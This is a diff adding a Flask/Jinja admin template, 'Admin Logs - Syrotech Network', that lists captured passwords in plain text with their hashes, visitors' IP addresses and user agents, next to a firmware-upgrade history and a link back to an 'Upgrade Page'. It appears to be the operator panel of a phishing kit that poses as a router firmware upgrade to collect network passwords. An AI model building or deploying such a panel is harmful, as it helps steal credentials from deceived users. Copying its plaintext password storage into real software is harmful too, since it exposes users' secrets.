@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Logs - Syrotech Network</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .admin-container {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        
+        .logs-section {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+            overflow: hidden;
+        }
+        
+        .logs-header {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+        }
+        
+        .logs-body {
+            padding: 2rem;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1rem;
+        }
+        
+        .data-table th,
+        .data-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #e9ecef;
+        }
+        
+        .data-table th {
+            background: #f8f9fa;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .data-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .status-badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+        
+        .status-completed {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .status-in-progress {
+            background: #d1ecf1;
+            color: #0c5460;
+        }
+        
+        .status-failed {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .status-started {
+            background: #fff3cd;
+            color: #856404;
+        }
+        
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.8rem 1.5rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            margin-bottom: 2rem;
+        }
+        
+        .back-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+            color: white;
+            text-decoration: none;
+        }
+        
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 1rem;
+            border-radius: 8px;
+            border: 1px solid #f5c6cb;
+            margin: 1rem 0;
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 2rem;
+            color: #666;
+            font-style: italic;
+        }
+        
+        .progress-bar-small {
+            width: 100px;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill-small {
+            height: 100%;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-container">
+        <a href="/" class="back-btn">
+            <i class="fas fa-arrow-left"></i>
+            Back to Upgrade Page
+        </a>
+        
+        <div class="header" style="margin-bottom: 2rem;">
+            <div class="router-icon">
+                <i class="fas fa-chart-line"></i>
+            </div>
+            <h1>Admin Dashboard</h1>
+            <p class="subtitle">Password & Upgrade Logs - Syrotech Network</p>
+        </div>
+
+        {% if error %}
+        <div class="error-message">
+            <i class="fas fa-exclamation-triangle"></i>
+            {{ error }}
+        </div>
+        {% endif %}
+
+        <!-- Password Logs Section -->
+        <div class="logs-section">
+            <div class="logs-header">
+                <h2><i class="fas fa-key"></i> Recent Password Entries</h2>
+            </div>
+            <div class="logs-body">
+                {% if passwords %}
+                <table class="data-table">                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Plain Password</th>
+                            <th>Hashed Password</th>
+                            <th>Date & Time</th>
+                            <th>IP Address</th>
+                            <th>User Agent</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody>                        {% for password in passwords %}
+                        <tr>
+                            <td>{{ password.id }}</td>
+                            <td>
+                                <span class="password-display" style="font-family: monospace; background: #f8f9fa; padding: 4px 8px; border-radius: 4px; color: #007bff; font-weight: 600;">
+                                    {{ password.password_plain or 'N/A' }}
+                                </span>
+                            </td>
+                            <td>
+                                <span style="font-family: monospace; font-size: 0.8rem; color: #666; max-width: 200px; display: inline-block; overflow: hidden; text-overflow: ellipsis;" title="{{ password.password_hash or 'N/A' }}">
+                                    {{ (password.password_hash[:20] + '...') if password.password_hash and password.password_hash|length > 20 else (password.password_hash or 'N/A') }}
+                                </span>
+                            </td>
+                            <td>{{ password.created_at.strftime('%Y-%m-%d %H:%M:%S') if password.created_at else 'N/A' }}</td>
+                            <td>{{ password.ip_address or 'Unknown' }}</td>
+                            <td title="{{ password.user_agent or 'Unknown' }}">
+                                {{ (password.user_agent[:50] + '...') if password.user_agent and password.user_agent|length > 50 else (password.user_agent or 'Unknown') }}
+                            </td>
+                            <td>
+                                <span class="status-badge {% if password.is_active %}status-completed{% else %}status-failed{% endif %}">
+                                    {% if password.is_active %}Active{% else %}Inactive{% endif %}
+                                </span>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+                {% else %}
+                <div class="no-data">
+                    <i class="fas fa-database"></i>
+                    <p>No password entries found.</p>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- Upgrade Logs Section -->
+        <div class="logs-section">
+            <div class="logs-header">
+                <h2><i class="fas fa-upload"></i> Firmware Upgrade History</h2>
+            </div>
+            <div class="logs-body">
+                {% if upgrades %}
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Started</th>
+                            <th>Completed</th>
+                            <th>Status</th>
+                            <th>Progress</th>
+                            <th>Version</th>
+                            <th>IP Address</th>
+                            <th>Current Step</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for upgrade in upgrades %}
+                        <tr>
+                            <td>{{ upgrade.id }}</td>
+                            <td>{{ upgrade.upgrade_started_at.strftime('%Y-%m-%d %H:%M:%S') if upgrade.upgrade_started_at else 'N/A' }}</td>
+                            <td>{{ upgrade.upgrade_completed_at.strftime('%Y-%m-%d %H:%M:%S') if upgrade.upgrade_completed_at else 'In Progress' }}</td>
+                            <td>
+                                <span class="status-badge status-{{ upgrade.status }}">
+                                    {{ upgrade.status.title() }}
+                                </span>
+                            </td>
+                            <td>
+                                <div class="progress-bar-small">
+                                    <div class="progress-fill-small" style="width: {{ upgrade.progress or 0 }}%"></div>
+                                </div>
+                                <small>{{ upgrade.progress or 0 }}%</small>
+                            </td>
+                            <td>
+                                {{ upgrade.firmware_version_from or 'N/A' }} → {{ upgrade.firmware_version_to or 'N/A' }}
+                            </td>
+                            <td>{{ upgrade.ip_address or 'Unknown' }}</td>
+                            <td title="{{ upgrade.current_step or 'N/A' }}">
+                                {{ (upgrade.current_step[:30] + '...') if upgrade.current_step and upgrade.current_step|length > 30 else (upgrade.current_step or 'N/A') }}
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+                {% else %}
+                <div class="no-data">
+                    <i class="fas fa-database"></i>
+                    <p>No upgrade history found.</p>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</body>
+</html>
